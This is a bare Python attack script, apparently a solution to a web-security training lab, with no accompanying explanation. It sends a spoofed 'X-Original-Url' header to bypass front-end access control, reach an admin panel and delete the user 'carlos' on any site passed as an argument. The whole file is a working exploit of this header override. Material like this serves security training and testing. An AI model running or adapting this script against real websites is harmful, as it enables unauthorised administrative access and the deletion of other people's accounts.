import requests
import sys

def check_admin(url):
    print("(+) Checking the admin page...")
    header = {"X-Original-Url": "/admin"}
    response = requests.get(url, headers=header)
    if response.status_code == 200:
        print("(+) Successfully accessed the admin panel with the header 'X-Original-Url: /admin'")
    else:
        print("(-) Couldn't access the admin panel!")
        print("(-) Exiting")
        exit(1)

def delete_user(url):
    print("(+) Deleting user Carlos...")
    header = {"X-Original-Url": "/admin/delete"}
    del_url = url + "/?username=carlos"
    response = requests.get(del_url, headers=header, allow_redirects=False)
    if response.status_code == 302:
        print("(+) Deleted user Carlos Successfully!")
    else:
        print("(-) Something went wrong! Could not delete user Carlos.")
        print("(-) Exiting...")
        exit(1)



def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python {sys.argv[0]} website")
        print(f"(+) Example: python {sys.argv[0]} www.example.com")
        exit(1)
    else:
        print("(+) Starting the script...")
        url = sys.argv[1]
        check_admin(url)
        delete_user(url)

if __name__ == "__main__":
    main()